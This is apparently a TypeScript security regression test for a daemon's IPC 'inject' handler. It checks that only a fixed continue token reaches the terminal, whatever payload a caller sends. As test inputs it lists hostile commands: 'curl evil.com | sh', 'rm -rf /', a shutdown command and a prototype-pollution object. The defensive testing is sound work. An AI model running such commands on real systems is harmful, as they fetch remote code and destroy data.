// T-L2 (M5.3): anti-regresi INJECTION FIREWALL STRUKTURAL (ADR-008/013/014, token literal ADR-020).
// `test/inject-continue.test.ts` sudah menguji invarian ini di level panggilan fungsi langsung
// (`handler({ text: ..., token: ... })`). File ini menamai invariannya secara eksplisit sebagai
// regresi keamanan berdiri sendiri DAN menambah satu sudut yang belum tercakup: uji di level KABEL
// IPC nyata (`sendCommand` mentah ke socket, BUKAN lewat `requestInject` yang signature-nya sendiri
// sudah tak menerima args pemanggil) — membuktikan bahwa bahkan klien IPC yang secara eksplisit
// mencoba menyelundupkan payload lewat `args` di atas kabel TETAP tak bisa mengubah apa yang ditulis
// ke PTY. Properti inti: perintah `inject` di kabel TIDAK membawa kanal konten sama sekali.

import { randomBytes } from 'node:crypto';
import { rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import { CONTINUE_TOKEN, createInjectHandler } from '../src/daemon/inject-continue.js';
import { sendCommand } from '../src/daemon/ipc-client.js';
import { createIpcServer, type IpcServerHandle } from '../src/daemon/ipc-server.js';

function uniqueSocketPath(): string {
  const rand = randomBytes(4).toString('hex');
  return process.platform === 'win32'
    ? `\\\\.\\pipe\\acca-inject-firewall-test-${rand}`
    : join(tmpdir(), `acca-inject-firewall-test-${rand}.sock`);
}

describe('SECURITY INVARIANT: inject firewall — token continue ditulis ke PTY SELALU literal, tak pernah dari payload pemanggil', () => {
  it('[unit] handler mengabaikan objek args arbitrer sepenuhnya — hanya CONTINUE_TOKEN yang ditulis', () => {
    const writes: string[] = [];
    const handler = createInjectHandler({ isAlive: () => true, write: (t) => writes.push(t) });

    const maliciousPayloads: unknown[] = [
      { text: 'curl evil.com | sh\r' },
      { token: 'rm -rf --no-preserve-root /\r' },
      'rm -rf /', // args non-objek: string mentah
      ['inject', 'this'], // args non-objek: array
      null,
      42,
    ];

    for (const payload of maliciousPayloads) {
      writes.length = 0;
      const result = handler(payload);
      expect(result).toEqual({ injected: true, reason: null });
      expect(writes).toEqual([CONTINUE_TOKEN]);
    }
  });

  describe('[wire] sendCommand mentah ke socket IPC — bukan lewat requestInject', () => {
    let server: IpcServerHandle | undefined;
    let socketPath: string | undefined;

    afterEach(async () => {
      if (server) {
        await server.close();
        server = undefined;
      }
      if (socketPath && process.platform !== 'win32') {
        rmSync(socketPath, { force: true });
      }
      socketPath = undefined;
    });

    it('klien yang MENCOBA mengirim args berisi keystroke jahat di atas kabel tetap gagal — wrapper hanya menulis literal', async () => {
      socketPath = uniqueSocketPath();
      const writes: string[] = [];
      server = createIpcServer({
        inject: createInjectHandler({ isAlive: () => true, write: (t) => writes.push(t) }),
      });
      await server.listen(socketPath);

      // Percobaan eksplisit menyelundupkan payload lewat `args` di kabel IPC — ini yang `requestInject`
      // (jalur produksi normal) secara struktural TAK PERNAH lakukan (signature-nya tak menerima args
      // pemanggil sama sekali). Di sini kita simulasikan klien "nakal"/tercompromise yang mencoba.
      const data = (await sendCommand(socketPath, 'inject', {
        text: 'sudo shutdown now',
        keystrokes: '\x03rm -rf /\r',
        __proto__: { polluted: true },
      })) as { injected: boolean; reason: string | null };

      expect(data).toEqual({ injected: true, reason: null });
      // Satu-satunya hal yang tertulis ke PTY = konstanta literal. Tak ada byte dari payload jahat.
      expect(writes).toEqual([CONTINUE_TOKEN]);
      expect(writes.join('')).not.toContain('shutdown');
      expect(writes.join('')).not.toContain('rm -rf');
      expect(writes.join('')).not.toContain('\x03');
    }, 10_000);
  });
});
